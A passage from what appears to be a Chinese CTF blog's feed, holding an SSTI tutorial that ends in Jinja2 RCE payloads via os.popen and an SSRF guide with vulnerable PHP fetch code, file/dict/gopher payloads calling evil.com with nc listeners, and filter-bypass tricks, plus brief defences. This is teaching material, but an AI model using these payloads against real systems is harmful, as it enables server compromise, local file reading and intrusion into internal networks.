alt="img"></p><p> 当然这样一个一个递进上去的方法有一些麻烦，所以我们可以使用<strong>mro</strong>魔术方法来一步到位看到类的所有父类</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/46eef7a33066770af3e60cfaac0058f7.png" alt="img"></p><p>由于它是以数组形式的所以我们在后面加上下标就能拿到指定的类了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d5a6a4672f9a1ccbfd8243b789e792ad.png" alt="img"></p><p>或许你看到这里可能感觉没什么用的样子，但是我希望能把这里理解的透彻一些，这样对于后面理解攻击payload会很有帮助 </p><p>我们在拿到object类后就可以通过object类来查找python中的所有object类的子类，当然这其中会有我们能通过该类rce的子类。我们通过<strong>subclasses</strong>来获取当前类的所有子类<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/24edbadb9ad62466cff298486ae13f07.png" alt="img"></p><p>可以发现有很多类，前面我们也说到了python的所有类最终都是继承object类的，因此这里存在大量的类，当然我们最终的目的是要去进行rce，因此我们应该寻找与之相关的类，这里就给出一个类<class 'os._wrap_close'>，我们在这里找一下，一般大概在第139个，不过具体的环境还是要具体分析，比如我这里就是138<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/32322115743a0c2c9e1bd8bb1030689c.png" alt="img"></p><p>跟前面的<strong>mro</strong>魔术方法一样是用数组表示的，可以用下标找到对应的类。接下来我们给这个类进行一些初始化方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a1580dabda5d7e8c5650908f99c21b90.png" alt="img"></p><p>初始化方法后可以通过<strong>globals</strong>魔术方法来返回当前类方法中的全局变量字典，可能有一点点抽象，我也不太懂具体是返回什么，但是大致就是返回当前类的全局变量</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a57a84281c102d35a1952386499a3bd4.png" alt="img"></p><p>可以发现很多全局变量都在里面，我们需要最后能够进行rce，因此应该找到能执行系统命令的方法，这里用popen函数来执行系统命令，在后面加上具体的函数名即可找到对应的函数</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1349cff6c89f458812eff436f68c7b41.png" alt="img"></p><p> 我们执行一下shell命令，这里执行一下whoami，这里一定要记得用.read()来读取一下，因为popen方法返回的是一个与子进程通信的对象，为了从该对象中获取子进程的输出，因此需要使用read()方法来读取子进程的输出】。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5c13d7c7df91b9d0be15f9e52b194454.png" alt="img"></p><p>可以发现成功执行系统命令，这里我们就其实通过类的继承关系里大致讲完了SSTI的一个攻击的思路。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p> 上面用的魔术方法这里总结一下，其他更多的魔术方法之后在补充一下</p><p><strong>class</strong>   ：返回类型所属的对象<br><strong>mro</strong>     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><strong>base</strong>   ：返回该对象所继承的父类<br><strong>mro</strong>     ：返回该对象的所有父类</p><p><strong>subclasses</strong>()  获取当前类的所有子类<br><strong>init</strong>  类的初始化方法<br><strong>globals</strong>  对包含(保存)函数全局变量的字典的引用</p><p>我们可以直接使用下面这些来直接获取对应的类</p><blockquote><p>‘’.<strong>class</strong></p><p>().<strong>class</strong></p><p>[].<strong>class</strong></p><p>“”.<strong>class</strong></p><p>{}.<strong>class</strong></p></blockquote><p>长度限制绕过：</p><p>1.使用较短的注入：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__.os.popen</span>(<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">*</span><span class="template-variable">&#123;&#123;<span class="name">lipsum.__globals__.os.popen</span>(<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>2.使用全局变量：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.update(a=config.update)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.a(f=lipsum.__globals__)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.a(o=config.f.os)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.a(p=config.o.popen)%&#125;</span><br><span class="line">&#123;&#123;config.p(<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">🥧SSTI漏洞</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="https://example.com/posts/50cf5e7c.html"/>
    <id>https://example.com/posts/50cf5e7c.html</id>
    <published>2024-12-01T15:07:55.025Z</published>
    <updated>2024-12-01T16:06:22.811Z</updated>
    
    <content type="html"><![CDATA[<p>SSRF漏洞原理攻击与防御</p><p>一、SSRF是什么？<br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>二、SSRF漏洞原理<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/966c60217969cfa4cf88e7c25bc06ea9.png" alt="在这里插入图片描述"></p><p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p><p>三、SSRF漏洞挖掘<br>1、分享：通过URL地址分享网页内容</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/407be09f844afc7ebd841f62875762b6.jpeg" alt="在这里插入图片描述"></p><p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p><p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9a65e1c17a2c64f2f1a3cf799922f881.png" alt="在这里插入图片描述">4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="built_in">title</span>.xxx.com/<span class="built_in">title</span>?<span class="built_in">title</span>=http://<span class="built_in">title</span>.xxx.com/as52ps63de</span><br></pre></td></tr></table></figure><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p><p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0b34525503d3f85c341b0c59f3f277f8.png" alt="在这里插入图片描述"></p><p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p><p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p><p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">share</span><br><span class="line">wap</span><br><span class="line">url</span><br><span class="line">link</span><br><span class="line"><span class="attribute">src</span></span><br><span class="line"><span class="selector-tag">source</span></span><br><span class="line">target</span><br><span class="line">u</span><br><span class="line"><span class="attribute">display</span></span><br><span class="line">sourceURl</span><br><span class="line">imageURL</span><br><span class="line">domain</span><br></pre></td></tr></table></figure><p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p><p>四、产生SSRF漏洞的函数<br>SSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。</p><p>1、file_get_contents:</p><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2、sockopen():</p><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>3、curl_exec():</p><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意事项:</p><p>1.一般情况下PHP不会开启fopen的gopher wrapper<br>2.file_get_contents的gopher协议不能URL编码<br>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br>4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br>5.curl_exec() 默认不跟踪跳转，<br>6.file_get_contents() file_get_contents支持php://input协议</p><p>五、SSRF中URL的伪协议<br>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p><p>file:/// 从文件系统中获取文件内容，如，file:///etc/passwd<br>dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：<br>sftp:// SSH文件传输协议或安全文件传输协议<br>ldap:// 轻量级目录访问协议<br>tftp:// 简单文件传输协议<br>gopher:// 分布式文档传递服务，可使用gopherus生成payload</p><p>1、file</p><p>这种URL Schema可以尝试从文件系统中获取文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/ssrf.php?url=file:/</span><span class="regexp">//</span>etc/passwd</span><br><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/ssrf.php?url=file:/</span><span class="regexp">//</span>C:<span class="regexp">/Windows/</span>win.ini</span><br></pre></td></tr></table></figure><p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p><p>2、dict</p><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?dict://evil.com:<span class="number">1337</span>/</span><br><span class="line"><span class="attribute">evil</span>.com:$ nc -lvp <span class="number">1337</span></span><br><span class="line"><span class="attribute">Connection</span> from<span class="meta"> [192.168.0.12] port 1337[tcp/*]</span></span><br><span class="line"><span class="attribute">accepted</span> (family <span class="number">2</span>, sport <span class="number">31126</span>)CLIENT libcurl <span class="number">7</span>.<span class="number">40</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>3、sftp</p><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?url=sftp://evil.com:<span class="number">1337</span>/</span><br><span class="line"><span class="attribute">evil</span>.com:$ nc -lvp <span class="number">1337</span></span><br><span class="line"><span class="attribute">Connection</span> from<span class="meta"> [192.168.0.12] port 1337[tcp/*]</span></span><br><span class="line"><span class="attribute">accepted</span> (family <span class="number">2</span>, sport <span class="number">37146</span>)SSH-<span class="number">2</span>.<span class="number">0</span>-libssh2_1.<span class="number">4</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure><p>4、ldap://或ldaps:// 或ldapi://</p><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?url=ldap://localhost:<span class="number">1337</span>/%<span class="number">0</span>astats%<span class="number">0</span>aquit</span><br><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?url=ldaps://localhost:<span class="number">1337</span>/%<span class="number">0</span>astats%<span class="number">0</span>aquit</span><br><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?url=ldapi://localhost:<span class="number">1337</span>/%<span class="number">0</span>astats%<span class="number">0</span>aquit</span><br></pre></td></tr></table></figure><p>5、tftp://</p><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/ssrf.php?url=tftp:/</span><span class="regexp">/evil.com:1337/</span>TESTUDPPACKET</span><br><span class="line">evil.com:<span class="comment"># nc -lvup 1337</span></span><br><span class="line">Listening on [<span class="number">0.0</span>.<span class="number">0.0</span>] (family <span class="number">0</span>, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure><p>6、gopher://</p><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">evil.com:# nc -lvp 1337</span></span><br><span class="line"><span class="language-xml">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span></span><br></pre></td></tr></table></figure><p>六、SSRF漏洞利用（危害）<br>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。.</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="number">192.168</span><span class="number">.64</span><span class="number">.144</span><span class="keyword">/phpmyadmin/</span></span><br><span class="line"><span class="symbol">file:</span><span class="comment">///D:/www.txt</span></span><br><span class="line"><span class="symbol">dict:</span><span class="comment">//192.168.64.144:3306/info</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//192.168.64.144:21</span></span><br></pre></td></tr></table></figure><p>七、SSRF绕过方式<br>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p><p>一、常见的绕过方式</p><p>1、限制为<a href="http://www.xxx.com">http://www.xxx.com</a> 域名时（利用@）</p><p>可以尝试采用http基本身份认证的方式绕过<br>如：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.aaa.com<span class="variable">@www</span>.bbb.com<span class="variable">@www</span>.ccc.com</span><br></pre></td></tr></table></figure><p>，在对@解析域名中，不同的处理函数存在处理差异<br>在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</p><p>2.采用短网址绕过</p><p>比如百度短地址<a href="https://dwz.cn/">https://dwz.cn/</a></p><p>3.采用进制转换</p><p>127.0.0.1</p><p>八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p><p>4.利用特殊域名</p><p>原理是DNS解析。xip.io可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p><p>5.利用[::]</p><p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254&gt;&gt;http://[::169.254.169.254">http://169.254.169.254&gt;&gt;http://[::169.254.169.254</a>]</p><p>6.利用句号</p><p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p><p>7、CRLF 编码绕过</p><p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">example</span>.com/?url=http://eval.com%<span class="number">0</span>d%<span class="number">0</span>aHOST:fuzz.com%<span class="number">0</span>d%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><p>8.利用封闭的字母数字</p><p>利用Enclosed alphanumerics</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line"><span class="link">http://169.254.169.254&gt;&gt;&gt;http://</span>[<span class="string">::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④</span>]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><p>二、常见限制</p><p>1.限制为<a href="http://www.xxx.com">http://www.xxx.com</a> 域名</p><p>采用http基本身份认证的方式绕过，即@</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//www.xxx.com@www.xxc.com</span></span><br></pre></td></tr></table></figure><p>2.限制请求IP不为内网地址</p><p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p><p>3.限制请求只为http协议</p><p>（1）采取302跳转<br>（2）采取短地址</p><p>八、SSRF漏防御<br>通常有以下5个思路：</p><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p><p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>]]></content>
    
    
    <summary type="html">🥧SSRF漏洞</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>xss漏洞</title>
    <link href="https://example.com/posts/c84cebac.html"/>
    <id>https://example.com/posts/c84cebac.html</id>
    <published>2024-12-01T15:07:55.022Z</published>
    <updated>2024-12-01T16:06:22.814Z</updated>
    
